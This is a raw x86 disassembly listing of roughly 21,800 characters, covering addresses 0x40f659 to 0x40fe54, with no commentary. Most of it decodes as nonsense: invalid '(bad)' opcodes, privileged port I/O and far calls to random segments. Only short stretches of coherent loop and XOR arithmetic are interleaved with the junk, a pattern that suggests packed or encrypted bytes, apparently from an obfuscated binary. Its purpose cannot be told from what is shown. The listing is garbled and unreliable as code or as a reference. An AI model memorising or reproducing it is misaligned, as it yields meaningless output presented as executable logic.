  40f659:	shl    BYTE PTR [edi-0x269f02ae],1
  40f65f:	and    BYTE PTR [ebx+esi*8],0xe0
  40f663:	(bad)  
  40f664:	xchg   edx,eax
  40f665:	out    dx,eax
  40f666:	(bad)  
  40f667:	in     al,dx
  40f668:	xor    eax,0xb495f20e
  40f66d:	ret    
  40f66e:	and    eax,ecx
  40f670:	fcmove st,st(7)
  40f672:	inc    ecx
  40f673:	sub    BYTE PTR [edi],al
  40f675:	(bad)  
  40f676:	pop    es
  40f677:	fimul  WORD PTR [ebp+0x37]
  40f67a:	scas   eax,DWORD PTR es:[edi]
  40f67b:	cmp    dx,WORD PTR [edx]
  40f67e:	call   0x722e:0x28cd4751
  40f685:	pop    es
  40f686:	(bad)  [edx-0x7]
  40f689:	iret   
  40f68a:	and    DWORD PTR [ebx],esp
  40f68c:	rol    ah,1
  40f68e:	push   esi
  40f68f:	xor    edx,DWORD PTR [ebp+0x209318be]
  40f695:	xor    eax,0x75bfc5bb
  40f69a:	cmp    BYTE PTR [ebx-0x5eaf761c],0x8d
  40f6a1:	sbb    eax,0x5cc936a6
  40f6a6:	ds sbb cl,al
  40f6a9:	jns    0x40f6a7
  40f6ab:	arpl   si,si
  40f6ad:	cmp    DWORD PTR [edx],edi
  40f6af:	mov    edi,DWORD PTR [edi-0x2339012f]
  40f6b5:	and    ah,BYTE PTR [edi-0x3fbec024]
  40f6bb:	push   esi
  40f6bc:	ret    
  40f6bd:	std    
  40f6be:	adc    ebx,DWORD PTR [ecx+0x9bfa0ed]
  40f6c4:	inc    eax
  40f6c5:	neg    BYTE PTR [ebx+eax*2-0xe]
  40f6c9:	fld    QWORD PTR [eax]
  40f6cb:	mov    ds:0x964df28f,eax
  40f6d0:	add    eax,0xfcc3fa01
  40f6d5:	rcr    DWORD PTR [ebp-0x32],cl
  40f6d8:	shr    DWORD PTR [ebx+0xb40399e],1
  40f6de:	ins    DWORD PTR es:[edi],dx
  40f6df:	jg     0x40f675
  40f6e1:	cmp    edx,esi
  40f6e3:	loopne 0x40f6ee
  40f6e5:	imul   esi,DWORD PTR [edi+0x77],0x4a
  40f6e9:	or     eax,0x7508db8f
  40f6ee:	sub    bl,BYTE PTR [ebp-0x49]
  40f6f1:	dec    edi
  40f6f2:	push   0xba46d1e7
  40f6f7:	repz jns 0x40f745
  40f6fa:	icebp  
  40f6fb:	scas   al,BYTE PTR es:[edi]
  40f6fc:	inc    eax
  40f6fd:	xchg   edi,eax
  40f6fe:	jb     0x40f6ff
  40f700:	mov    bh,0xcd
  40f702:	out    dx,al
  40f703:	sbb    eax,0x1f00993b
  40f708:	and    eax,0x8d44a35
  40f70d:	int    0xfb
  40f70f:	push   esi
  40f710:	(bad)  
  40f711:	out    dx,eax
  40f712:	or     eax,0x865460ea
  40f717:	or     BYTE PTR [eax-0x651e5523],ah
  40f71d:	jmp    0x51c7636f
  40f722:	xchg   esi,eax
  40f723:	mov    edi,0x355c0c86
  40f728:	cmp    eax,0xffadb57b
  40f72d:	dec    edx
  40f72e:	xor    al,0xb
  40f730:	cmp    cl,BYTE PTR [ecx]
  40f732:	fild   QWORD PTR [edi]
  40f734:	mov    al,0xdc
  40f736:	sbb    eax,0xeb0e4037
  40f73b:	pusha  
  40f73c:	cmp    edi,DWORD PTR [ebp+0x79e6b2d1]
  40f742:	xor    eax,0xa0f8ddff
  40f747:	push   esp
  40f748:	mov    esi,0x7c4cd8c0
  40f74d:	call   0x4ff1:0xc1fef643
  40f754:	shl    BYTE PTR [edi],cl
  40f756:	mov    cl,0xcb
  40f758:	sub    eax,0xa9875d0
  40f75d:	adc    DWORD PTR [ebx-0x4a],eax
  40f760:	adc    DWORD PTR [edx+0x53],0x12
  40f764:	xchg   ecx,eax
  40f765:	mov    dl,0x10
  40f767:	loop   0x40f771
  40f769:	mov    bl,BYTE PTR [edi+esi*8+0x5e468816]
  40f770:	cmp    al,BYTE PTR [eax-0x1c]
  40f773:	(bad)  [edx+0x15]
  40f776:	sub    BYTE PTR [ebx],0x22
  40f779:	sbb    al,bh
  40f77b:	jecxz  0x40f703
  40f77d:	ficomp WORD PTR [ebx-0x1e]
  40f780:	jge    0x40f71a
  40f782:	cmp    esp,DWORD PTR [edx-0x25]
  40f785:	adc    eax,0xf95d9a25
  40f78a:	rcr    DWORD PTR [ebx+0x79bedb8d],1
  40f790:	lock xchg ebp,eax
  40f792:	inc    esi
  40f793:	or     edi,DWORD PTR [ebp+0x6fa3b73e]
  40f799:	jo     0x40f744
  40f79b:	mov    edx,0x4c4c268e
  40f7a0:	loopne 0x40f807
  40f7a2:	cs das 
  40f7a4:	icebp  
  40f7a5:	sbb    eax,0xfd434ffa
  40f7aa:	pushf  
  40f7ab:	jle    0x40f72d
  40f7ad:	mov    esi,0x8a99a775
  40f7b2:	pop    ecx
  40f7b3:	lock pop esp
  40f7b5:	dec    eax
  40f7b6:	repnz fcom st(6)
  40f7b9:	leave  
  40f7ba:	add    BYTE PTR [esi-0x1a6104a8],dh
  40f7c0:	out    dx,al
  40f7c1:	and    eax,0xd40a572
  40f7c6:	inc    esi
  40f7c7:	leave  
  40f7c8:	pop    ss
  40f7c9:	adc    DWORD PTR [esi-0x49717782],0x3d
  40f7d0:	pop    es
  40f7d1:	sti    
  40f7d2:	xlat   BYTE PTR ds:[ebx]
  40f7d3:	ds sti 
  40f7d5:	push   ecx
  40f7d6:	(bad)  
  40f7d7:	pop    edi
  40f7d8:	popa   
  40f7d9:	mov    edx,DWORD PTR [esi+0x67]
  40f7dc:	mov    ecx,0x656f325d
  40f7e1:	dec    esi
  40f7e2:	imul   ecx,DWORD PTR [eax],0xffffffa2
  40f7e5:	(bad)  
  40f7e7:	das    
  40f7e8:	add    edx,ecx
  40f7ea:	cmp    edi,edx
  40f7ec:	mov    DWORD PTR ds:0x42a779,0x7d48
  40f7f6:	jmp    0x40fa7e
  40f7fb:	ret    0xc9cd
  40f7fe:	ret    
  40f7ff:	(bad)  
  40f801:	retf   0x10cd
  40f804:	test   BYTE PTR ds:0xd3deb45f,ch
  40f80a:	and    BYTE PTR [eax],0x47
  40f80d:	js     0x40f887
  40f80f:	in     eax,0x7e
  40f811:	js     0x40f88b
  40f813:	xor    edi,DWORD PTR [edi]
  40f815:	mov    eax,ds:0x160990
  40f81a:	mov    esi,0xf023b9f4
  40f81f:	lds    ebp,FWORD PTR [ebp+0x79a4178c]
  40f825:	repz push ebp
  40f827:	fdivp  st(5),st
  40f829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f82a:	add    ebp,esi
  40f82c:	lods   eax,DWORD PTR ds:[esi]
  40f82d:	mov    bl,0xa8
  40f82f:	mov    dl,0xe4
  40f831:	push   edi
  40f832:	mov    cr6,eax
  40f835:	xor    BYTE PTR [ebx],bh
  40f837:	push   esi
  40f838:	cmp    DWORD PTR [esi],0x4aaa7a3a
  40f83e:	mov    edx,0x35869ee2
  40f843:	xchg   BYTE PTR [ebx-0x41b3093a],dh
  40f849:	shr    eax,1
  40f84b:	cli    
  40f84c:	or     eax,0x5dcbc128
  40f851:	cwde   
  40f852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f853:	inc    edi
  40f854:	repz xchg bh,bl
  40f857:	dec    eax
  40f858:	mov    al,ds:0x8f5d5ad1
  40f85d:	xchg   esi,eax
  40f85e:	cli    
  40f85f:	test   eax,0xc5be4778
  40f864:	jb     0x40f8b3
  40f866:	iret   
  40f867:	and    DWORD PTR ds:0xc9c40c69,edi
  40f86d:	and    eax,0x40649a5b
  40f872:	mov    ebx,0x76efd0b6
  40f877:	dec    ebp
  40f878:	ins    BYTE PTR es:[edi],dx
  40f879:	mov    esp,0xdd21cc50
  40f87e:	jmp    0xc32cc08f
  40f883:	jnp    0x40f82d
  40f885:	hlt    
  40f886:	psubusb mm1,QWORD PTR [ebp-0x79]
  40f88a:	cdq    
  40f88b:	icebp  
  40f88c:	addr16 clc 
  40f88e:	push   ebx
  40f88f:	arpl   WORD PTR ds:0xeb9686c3,si
  40f895:	add    cl,BYTE PTR [eax+0x742dcc31]
  40f89b:	push   0x1f
  40f89d:	nop
  40f89e:	test   eax,0xb76379a7
  40f8a3:	adc    DWORD PTR [ebx-0x19],eax
  40f8a6:	add    DWORD PTR [edi+0x3dced165],esi
  40f8ac:	xor    BYTE PTR [di],bh
  40f8af:	hlt    
  40f8b0:	nop
  40f8b1:	icebp  
  40f8b2:	pop    es
  40f8b3:	cdq    
  40f8b4:	jbe    0x40f8aa
  40f8b6:	mov    esi,0xef37efb6
  40f8bb:	cmc    
  40f8bc:	xor    eax,0x65cc07bd
  40f8c1:	inc    edx
  40f8c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8c3:	mov    ch,0x3a
  40f8c5:	pop    esp
  40f8c6:	in     al,0xb7
  40f8c8:	fistp  DWORD PTR [ebx]
  40f8ca:	xchg   esi,eax
  40f8cb:	das    
  40f8cc:	or     al,0xa7
  40f8ce:	iret   
  40f8cf:	nop
  40f8d0:	jo     0x40f8f1
  40f8d2:	repnz sbb BYTE PTR [esi+0x24],bl
  40f8d6:	call   0x17845503
  40f8db:	ret    0x507b
  40f8de:	(bad)  
  40f8df:	stc    
  40f8e0:	mov    BYTE PTR [esi-0x2e4dd8aa],dh
  40f8e6:	mov    ah,0x85
  40f8e8:	cdq    
  40f8e9:	adc    BYTE PTR [edi-0x50],dh
  40f8ec:	loope  0x40f952
  40f8ee:	lds    edi,FWORD PTR [edx]
  40f8f0:	icebp  
  40f8f1:	call   0xf8a7:0x2d74a961
  40f8f8:	dec    edx
  40f8f9:	add    esp,esi
  40f8fb:	(bad)
  40f8fe:	outs   dx,DWORD PTR ds:[esi]
  40f8ff:	jnp    0x40f97f
  40f901:	leave  
  40f902:	mov    bl,0x51
  40f904:	xor    eax,0x851cbe70
  40f909:	xchg   ebx,ebp
  40f90b:	cli    
  40f90c:	jmp    0xe4b89770
  40f911:	mov    al,ds:0xee29c273
  40f916:	shl    DWORD PTR [ebp-0x64136c98],0x96
  40f91d:	or     al,0x5c
  40f91f:	shl    BYTE PTR [edi],1
  40f921:	add    ebp,ebx
  40f923:	xor    eax,0x67854eb8
  40f928:	and    cl,BYTE PTR [ebx-0x34bfe0a3]
  40f92e:	add    al,0xe3
  40f930:	cmc    
  40f931:	sbb    eax,0x9a019e18
  40f936:	pop    eax
  40f937:	dec    ebx
  40f938:	popa   
  40f939:	loope  0x40f919
  40f93b:	and    BYTE PTR [ebp-0x66],0xe0
  40f93f:	mov    ch,0xfb
  40f941:	or     bl,cl
  40f943:	inc    esi
  40f944:	mov    ebp,0x738ef2db
  40f949:	daa    
  40f94a:	ins    BYTE PTR es:[edi],dx
  40f94b:	xchg   ebx,eax
  40f94c:	aad    0xcc
  40f94e:	add    al,0x2a
  40f950:	bound  edx,QWORD PTR [esi-0x4024e61b]
  40f956:	fsubr  DWORD PTR [eax]
  40f958:	mov    bl,0x98
  40f95a:	jg     0x40f9d8
  40f95c:	and    al,0x35
  40f95e:	and    eax,esi
  40f960:	push   ebx
  40f961:	xchg   esi,eax
  40f962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f963:	inc    eax
  40f964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f965:	push   esp
  40f966:	fimul  DWORD PTR [eax-0x4748d63]
  40f96d:	mov    ah,BYTE PTR [esi+0x67]
  40f970:	mov    edx,0x6e3ccbaf
  40f975:	pop    ebp
  40f976:	aad    0xc
  40f978:	inc    esp
  40f979:	lods   eax,DWORD PTR ds:[esi]
  40f97a:	repnz and al,0xdd
  40f97d:	push   0x18bc769e
  40f982:	test   al,0x47
  40f984:	pop    esi
  40f985:	test   eax,0x965aebf6
  40f98a:	stc    
  40f98b:	jg     0x40f9b6
  40f98d:	inc    ebx
  40f98e:	sti    
  40f98f:	shr    eax,1
  40f991:	adc    esi,DWORD PTR [ebp+0x51b2031e]
  40f997:	es jnp 0x40f91a
  40f99a:	std    
  40f99b:	xchg   BYTE PTR [edx+0x22],al
  40f99e:	inc    esi
  40f99f:	fs cwde 
  40f9a1:	ja     0x40f93a
  40f9a3:	fild   QWORD PTR [eax+ebx*1]
  40f9a6:	push   ss
  40f9a7:	add    ecx,ebp
  40f9a9:	imul   esp,ecx,0xffffffff
  40f9ac:	sub    DWORD PTR [ebx],0xaab48b3a
  40f9b2:	outs   dx,DWORD PTR ds:[esi]
  40f9b3:	bound  edi,QWORD PTR [eax+0x7f1e4557]
  40f9b9:	cli    
  40f9ba:	jecxz  0x40f9bc
  40f9bc:	ss ds (bad) 
  40f9bf:	sbb    al,0xb4
  40f9c1:	in     eax,0xde
  40f9c3:	gs and eax,0xca5ba97e
  40f9c9:	or     ebp,esi
  40f9cb:	call   0xec7f:0x546849e
  40f9d2:	retf   0xeecd
  40f9d5:	mov    ds:0x5796360f,eax
  40f9da:	jne    0x40fa07
  40f9dc:	inc    edx
  40f9dd:	mov    dl,0xf9
  40f9df:	jmp    0x40f98a
  40f9e1:	jo     0x40fa54
  40f9e3:	jmp    0x2ab8b7a2
  40f9e8:	pop    es
  40f9e9:	adc    al,0xbf
  40f9eb:	push   cs
  40f9ec:	pop    es
  40f9ed:	cmc    
  40f9ee:	push   0x43
  40f9f0:	push   edi
  40f9f1:	mov    al,ds:0x328bb4b6
  40f9f6:	mov    bl,0x77
  40f9f8:	popf   
  40f9f9:	test   eax,0xb8169024
  40f9fe:	and    esi,DWORD PTR [edx-0x1]
  40fa01:	out    dx,al
  40fa02:	popf   
  40fa03:	aam    0x62
  40fa05:	mov    edi,0xb82f4258
  40fa0a:	loopne 0x40f9fb
  40fa0c:	icebp  
  40fa0d:	ficomp WORD PTR [edx]
  40fa0f:	adc    BYTE PTR [ebx],0x2f
  40fa12:	inc    ecx
  40fa13:	push   eax
  40fa14:	cmp    eax,0x39977bbc
  40fa19:	pop    ebx
  40fa1a:	iret   
  40fa1b:	imul   eax,DWORD PTR [eax+0x67],0xa
  40fa1f:	add    BYTE PTR [edx],bl
  40fa21:	arpl   WORD PTR [ebx+edx*4-0x75],di
  40fa25:	clc    
  40fa26:	addr16 out 0x2c,al
  40fa29:	imul   ecx,eax,0xfffffff7
  40fa2c:	out    dx,al
  40fa2d:	ds pop esi
  40fa2f:	push   es
  40fa30:	xor    DWORD PTR [eax-0x24],esi
  40fa33:	imul   ecx,DWORD PTR [ebp-0xe],0xffffff99
  40fa37:	gs stos DWORD PTR es:[edi],eax
  40fa39:	sbb    BYTE PTR [ecx-0x67],bh
  40fa3c:	xor    ah,BYTE PTR [edi+0x23f1a1c4]
  40fa42:	pop    edi
  40fa43:	pop    ss
  40fa44:	mov    ch,0x33
  40fa46:	jo     0x40fa61
  40fa48:	adc    DWORD PTR [ecx],edx
  40fa4a:	aaa    
  40fa4b:	arpl   WORD PTR [edx-0x105fefa],bx
  40fa51:	jno    0x40fa26
  40fa53:	aaa    
  40fa54:	dec    eax
  40fa55:	aas    
  40fa56:	cmp    bl,0xd2
  40fa59:	ins    DWORD PTR es:[edi],dx
  40fa5a:	sbb    BYTE PTR [esi+0x64],0xe0
  40fa5e:	dec    ecx
  40fa5f:	jne    0x40fad1
  40fa61:	arpl   WORD PTR [eax],bx
  40fa63:	mov    bl,0x65
  40fa65:	in     eax,0x1a
  40fa67:	retf   
  40fa68:	and    BYTE PTR [edi+0x2f],bh
  40fa6b:	and    ecx,eax
  40fa6d:	aam    0xd4
  40fa6f:	or     dh,BYTE PTR [edx+0xbfd9045]
  40fa75:	sbb    esp,0xffffff9f
  40fa78:	cmp    DWORD PTR [edx+0x32048f1d],0x53ab840f
  40fa82:	add    BYTE PTR [eax],al
  40fa84:	push   ebx
  40fa85:	mov    DWORD PTR ds:0x42a809,0x5779
  40fa8f:	jmp    0x4148fa
  40fa94:	mov    DWORD PTR ds:0x42a7c1,0x1b
  40fa9e:	cmp    DWORD PTR ds:0x42a7c1,0x0
  40faa5:	je     0x40faf7
  40faab:	cmp    DWORD PTR ds:0x42a7c1,0x7
  40fab2:	jne    0x40facb
  40fab8:	push   0x6ecd
  40fabd:	push   0x4c4c
  40fac2:	push   DWORD PTR [ebp-0x1c]
  40fac5:	call   DWORD PTR ds:0x41d1a8
  40facb:	cmp    DWORD PTR ds:0x42a7c1,0x8
  40fad2:	jne    0x40fae5
  40fad8:	mov    edi,DWORD PTR ds:0x42a7c1
  40fade:	dec    edi
  40fadf:	mov    DWORD PTR ds:0x42a7c1,edi
  40fae5:	mov    edi,DWORD PTR ds:0x42a7c1
  40faeb:	dec    edi
  40faec:	mov    DWORD PTR ds:0x42a7c1,edi
  40faf2:	jmp    0x40fa9e
  40faf7:	mov    edx,DWORD PTR [ebp-0x8]
  40fafa:	mov    edi,DWORD PTR [ebp-0x10]
  40fafd:	jmp    0x40fd85
  40fb02:	cmp    eax,0xd9c7c9d6
  40fb07:	fcmovnb st,st(1)
  40fb09:	(bad)  
  40fb0a:	cmc    
  40fb0b:	into   
  40fb0c:	inc    edx
  40fb0d:	jge    0x40fb8d
  40fb0f:	xchg   ebp,eax
  40fb10:	ficomp DWORD PTR [esi+0x7878458d]
  40fb16:	in     eax,0x7e
  40fb18:	js     0x40fb92
  40fb1a:	mov    ds:0x32fba557,eax
  40fb1f:	pop    DWORD PTR [ecx+edx*4+0x6a98b111]
  40fb26:	cmc    
  40fb27:	cs add al,0xda
  40fb2a:	in     eax,0x57
  40fb2c:	das    
  40fb2d:	mov    BYTE PTR [edi-0x451844ad],0xeb
  40fb34:	ins    BYTE PTR es:[edi],dx
  40fb35:	jne    0x40fabc
  40fb37:	mov    eax,0x47e60688
  40fb3c:	gs sub al,0x68
  40fb3f:	ret    
  40fb40:	in     al,0x4e
  40fb42:	rol    DWORD PTR [eax],1
  40fb44:	fiadd  WORD PTR [eax+ebp*2+0x13]
  40fb48:	inc    esp
  40fb49:	imul   ebx,DWORD PTR [ebx],0xac9b3fca
  40fb4f:	xor    BYTE PTR [edx+0x220cfb92],bh
  40fb55:	jae    0x40fb01
  40fb57:	jmp    0x40fb14
  40fb59:	sub    eax,0xc1669a69
  40fb5e:	jns    0x40fb6d
  40fb60:	and    eax,ebp
  40fb62:	sub    DWORD PTR [eax],eax
  40fb64:	pop    es
  40fb65:	inc    esi
  40fb66:	jae    0x40fbe0
  40fb68:	jo     0x40fb94
  40fb6a:	mov    WORD PTR [ebp+0x2fb25137],ds
  40fb70:	xchg   DWORD PTR [ebp-0x7bf2af13],esp
  40fb76:	mov    esp,0x23b9434a
  40fb7b:	push   eax
  40fb7c:	push   ecx
  40fb7d:	lods   eax,DWORD PTR ds:[esi]
  40fb7e:	cmp    DWORD PTR [ecx-0x120ff1ea],ebp
  40fb84:	cs out dx,eax
  40fb86:	cmp    ebp,edi
  40fb88:	add    al,0x70
  40fb8a:	jo     0x40fb7b
  40fb8c:	jg     0x40fbc1
  40fb8e:	inc    eax
  40fb8f:	inc    ebp
  40fb90:	inc    edi
  40fb91:	mov    ah,0xd8
  40fb93:	ror    DWORD PTR [ecx],0x29
  40fb96:	sbb    ecx,DWORD PTR [ecx+0x3a]
  40fb99:	outs   dx,BYTE PTR ds:[esi]
  40fb9a:	cdq    
  40fb9b:	sub    dh,BYTE PTR [eax-0x29]
  40fb9e:	add    al,0x4b
  40fba0:	stos   DWORD PTR es:[edi],eax
  40fba1:	mov    ebp,0x9abd0d96
  40fba6:	xchg   ebx,eax
  40fba7:	out    dx,eax
  40fba8:	xchg   edx,eax
  40fba9:	loop   0x40fc0b
  40fbab:	pop    esp
  40fbac:	xchg   DWORD PTR [esi-0x45],edi
  40fbaf:	mov    dh,0xaa
  40fbb1:	push   0xfd278599
  40fbb6:	cli    
  40fbb7:	jae    0x40fb68
  40fbb9:	xchg   edi,eax
  40fbba:	jns    0x40fb66
  40fbbc:	mov    esi,0xf0f7710a
  40fbc1:	addr16 pop ss
  40fbc3:	imul   ebx,esi,0x4f
  40fbc6:	call   0xfa23b669
  40fbcb:	jb     0x40fbaf
  40fbcd:	mov    edx,DWORD PTR [edx+0xde8d745]
  40fbd3:	dec    esp
  40fbd4:	pop    DWORD PTR [ecx-0x47]
  40fbd7:	(bad)  
  40fbd8:	in     eax,0x4b
  40fbda:	jge    0x40fb89
  40fbdc:	gs stc 
  40fbde:	adc    dh,dh
  40fbe0:	inc    ecx
  40fbe1:	hlt    
  40fbe2:	ret    0xaec4
  40fbe5:	(bad)  
  40fbe6:	cmc    
  40fbe7:	sub    BYTE PTR [ebx],0x99
  40fbea:	(bad)  
  40fbeb:	pop    ebx
  40fbec:	or     ebp,DWORD PTR [ecx-0x6c]
  40fbef:	dec    esi
  40fbf0:	aas    
  40fbf1:	jge    0x40fb78
  40fbf3:	(bad)  
  40fbf4:	xor    esi,edx
  40fbf6:	pop    ss
  40fbf7:	ret    0x79e4
  40fbfa:	out    dx,al
  40fbfb:	push   esp
  40fbfc:	and    cl,0xae
  40fbff:	cli    
  40fc00:	and    bl,BYTE PTR [bp+si-0x5830]
  40fc05:	pop    es
  40fc06:	mov    al,ds:0xa89429bd
  40fc0b:	pop    esp
  40fc0c:	xor    eax,0x3818f26e
  40fc11:	or     eax,0x22de9ba2
  40fc16:	push   esi
  40fc17:	pop    esp
  40fc18:	xor    eax,0x870b8d64
  40fc1d:	loopne 0x40fc3a
  40fc1f:	jbe    0x40fc9a
  40fc21:	bnd jp 0x40fc16
  40fc24:	stos   DWORD PTR es:[edi],eax
  40fc25:	(bad)  
  40fc26:	push   esp
  40fc27:	fwait
  40fc28:	pop    ds
  40fc29:	aam    0x80
  40fc2b:	stos   DWORD PTR es:[edi],eax
  40fc2c:	sub    eax,0x16c1daa9
  40fc31:	sub    eax,0xf5d528a4
  40fc36:	cld    
  40fc37:	mov    ch,0xf0
  40fc39:	pop    ebx
  40fc3a:	ret    0x2f1e
  40fc3d:	(bad)  [edi]
  40fc3f:	or     al,0x63
  40fc41:	out    dx,eax
  40fc42:	icebp  
  40fc43:	mov    bl,0x26
  40fc45:	scas   al,BYTE PTR es:[edi]
  40fc46:	pop    edx
  40fc47:	sub    dl,BYTE PTR [ecx+0x7addeb3d]
  40fc4d:	fcmovu st,st(2)
  40fc4f:	imul   esp,DWORD PTR [ebx+ecx*4+0x26],0x8c647a57
  40fc57:	jge    0x40fbff
  40fc59:	dec    ebp
  40fc5a:	int3   
  40fc5b:	(bad)  [esp+eax*4-0x71b8c68d]
  40fc62:	and    eax,0x61e12d7a
  40fc67:	cli    
  40fc68:	lods   al,BYTE PTR ds:[esi]
  40fc69:	pop    es
  40fc6a:	repnz mov cl,0xe4
  40fc6d:	shl    cl,1
  40fc6f:	sub    DWORD PTR [ebx+0x69ae9835],ebp
  40fc75:	jge    0x40fc4e
  40fc77:	mov    al,ds:0x275eece7
  40fc7c:	mov    cs,WORD PTR [eax]
  40fc7e:	or     ebp,DWORD PTR [eax]
  40fc80:	sbb    al,bh
  40fc82:	sbb    eax,0x6702835d
  40fc87:	sub    al,0xe7
  40fc89:	xor    eax,0x4e2c1845
  40fc8e:	add    al,BYTE PTR [esi-0x1c]
  40fc91:	cmp    ah,BYTE PTR [esi+eax*1]
  40fc94:	shl    DWORD PTR [esp+ebx*1+0x336d2067],1
  40fc9b:	sbb    ecx,ebp
  40fc9d:	mov    ch,0x5f
  40fc9f:	jge    0x40fc55
  40fca1:	rol    DWORD PTR [esi],1
  40fca3:	mov    esp,0x46eb704b
  40fca8:	(bad)  ds:0x8bd705c1
  40fcae:	cli    
  40fcaf:	lahf   
  40fcb0:	cwde   
  40fcb1:	xchg   ebp,eax
  40fcb2:	sub    cl,BYTE PTR [edx-0x3e]
  40fcb5:	mov    DWORD PTR [ecx+0x2d],esi
  40fcb8:	mov    eax,ds:0xdab3f258
  40fcbd:	or     eax,esp
  40fcbf:	mov    al,0x9
  40fcc1:	pop    ecx
  40fcc2:	sub    edi,DWORD PTR [ecx+0x2171de25]
  40fcc8:	cmp    esp,esi
  40fcca:	out    dx,eax
  40fccb:	sti    
  40fccc:	ror    DWORD PTR [ebx+esi*8+0x243b0965],1
  40fcd3:	mov    bl,BYTE PTR [ebx]
  40fcd5:	lahf   
  40fcd6:	pop    edi
  40fcd7:	mov    ah,0x28
  40fcd9:	js     0x40fd3f
  40fcdb:	and    ebx,esi
  40fcdd:	mov    al,0xd8
  40fcdf:	fmul   QWORD PTR [edx-0x28e93650]
  40fce5:	daa    
  40fce6:	ret    0x53d
  40fce9:	cmp    dh,cl
  40fceb:	nop
  40fcec:	push   ebp
  40fced:	scas   al,BYTE PTR es:[edi]
  40fcee:	inc    esi
  40fcef:	dec    esp
  40fcf0:	dec    edx
  40fcf1:	jmp    0x3369:0x82263bb2
  40fcf8:	das    
  40fcf9:	mov    ecx,0x73926749
  40fcfe:	dec    ecx
  40fcff:	fsubr  DWORD PTR [esi-0x535fbcd9]
  40fd05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd06:	inc    ebx
  40fd07:	popf   
  40fd08:	in     al,0x15
  40fd0a:	test   edx,ecx
  40fd0c:	xlat   BYTE PTR ds:[ebx]
  40fd0d:	mov    ds:0x597507cc,eax
  40fd12:	mov    dh,0x97
  40fd14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd15:	ret    0x5ad2
  40fd18:	sub    eax,0x4ae7b182
  40fd1d:	std    
  40fd1e:	adc    DWORD PTR [edx-0x13bfca0e],esi
  40fd24:	fldenv [esp+eax*4+0x7fe3a897]
  40fd2b:	repz inc dx
  40fd2e:	mov    al,ds:0xd822eee
  40fd33:	mov    cl,bl
  40fd35:	adc    DWORD PTR [esi+0x6106daa1],esp
  40fd3b:	mov    eax,0xe7ec4dbe
  40fd40:	enter  0x7874,0x18
  40fd44:	jmp    0xd1dd50d9
  40fd49:	add    ah,bh
  40fd4b:	add    eax,0xd69902ab
  40fd50:	xchg   esp,eax
  40fd51:	mov    eax,ds:0x9ec87b69
  40fd56:	aaa    
  40fd57:	jno    0x40fd89
  40fd59:	pop    eax
  40fd5a:	adc    al,0xc1
  40fd5c:	jae    0x40fd6a
  40fd5e:	xchg   esi,eax
  40fd5f:	leave  
  40fd60:	ret    
  40fd61:	adc    BYTE PTR [edi+0x25],al
  40fd64:	je     0x40fd87
  40fd66:	idiv   bl
  40fd68:	mov    ebp,0x6255726b
  40fd6d:	lahf   
  40fd6e:	sbb    eax,0x9bf949f6
  40fd73:	aad    0x3c
  40fd75:	js     0x40fd55
  40fd77:	das    
  40fd78:	dec    ebx
  40fd79:	xlat   BYTE PTR ds:[ebx]
  40fd7a:	ja     0x40fd9d
  40fd7c:	mov    al,0x65
  40fd7e:	mov    ecx,0xaf0ba378
  40fd83:	test   bh,0x2b
  40fd86:	cli    
  40fd87:	mov    edx,DWORD PTR [ebp-0x4]
  40fd8a:	xor    edx,eax
  40fd8c:	add    edx,ecx
  40fd8e:	cmp    edi,edx
  40fd90:	jb     0x414e2e
  40fd96:	mov    edx,DWORD PTR [ebp-0x28]
  40fd99:	mov    edi,DWORD PTR [ebp-0x4]
  40fd9c:	xor    edx,eax
  40fd9e:	xor    edi,eax
  40fda0:	add    edi,ecx
  40fda2:	add    edx,ecx
  40fda4:	imul   edx,edi
  40fda7:	mov    edi,DWORD PTR [ebp-0x8]
  40fdaa:	jmp    0x410032
  40fdaf:	mov    ecx,0xcac93ec5
  40fdb5:	(bad)  
  40fdb6:	leave  
  40fdb7:	dec    esp
  40fdb8:	mov    bl,0x33
  40fdba:	std    
  40fdbb:	or     dl,BYTE PTR [ecx+0x4b7a17fe]
  40fdc1:	js     0x40fe3b
  40fdc3:	in     eax,0x7e
  40fdc5:	js     0x40fe3f
  40fdc7:	sbb    eax,0x51ba162
  40fdcc:	test   al,0x86
  40fdce:	dec    edi
  40fdcf:	enter  0x3b79,0x89
  40fdd3:	pop    es
  40fdd4:	shr    DWORD PTR [esi+0x21ef5c28],1
  40fdda:	inc    ebp
  40fddb:	mov    al,0x87
  40fddd:	adc    BYTE PTR [esi],bh
  40fddf:	xchg   ecx,eax
  40fde0:	pop    ss
  40fde1:	inc    edx
  40fde2:	and    eax,0x4871756f
  40fde7:	enter  0xa88,0x98
  40fdeb:	je     0x40fd98
  40fded:	in     eax,dx
  40fdee:	jae    0x40fe0a
  40fdf0:	cmc    
  40fdf1:	fcomp  DWORD PTR ds:0x7fc55fd6
  40fdf7:	xor    esi,esp
  40fdf9:	push   es
  40fdfa:	or     al,0x8
  40fdfc:	cmp    DWORD PTR [ecx+0x5e],ebx
  40fdff:	shl    DWORD PTR [esi+eiz*8],1
  40fe02:	dec    edx
  40fe03:	or     DWORD PTR [ebp-0x30c586f5],0xaf858c61
  40fe0d:	sbb    al,0x7
  40fe0f:	fidivr DWORD PTR [edx-0x258b185e]
  40fe15:	pop    ebx
  40fe16:	aaa    
  40fe17:	(bad)  
  40fe19:	inc    ebx
  40fe1a:	or     al,BYTE PTR [ebp+0x55615a]
  40fe20:	sbb    esi,edx
  40fe22:	div    BYTE PTR [ebp-0x42bc38ab]
  40fe28:	ins    BYTE PTR es:[edi],dx
  40fe29:	in     eax,0xa4
  40fe2b:	jns    0x40fe31
  40fe2d:	(bad)  
  40fe2f:	and    al,0x9d
  40fe31:	cmovns ecx,DWORD PTR [edi+0x62d50bb8]
  40fe38:	test   al,0xe7
  40fe3a:	sub    eax,0x2ba4dc2f
  40fe3f:	fwait
  40fe40:	and    ch,BYTE PTR [ecx-0x9eacadf]
  40fe46:	fwait
  40fe47:	xchg   ecx,eax
  40fe48:	in     al,0x48
  40fe4a:	inc    edx
  40fe4b:	jo     0x40fdfd
  40fe4d:	or     DWORD PTR [ebp+0x6fed4112],0x5e
  40fe54:	or     edx,DWORD PTR [ebx-0x5aa120a2]
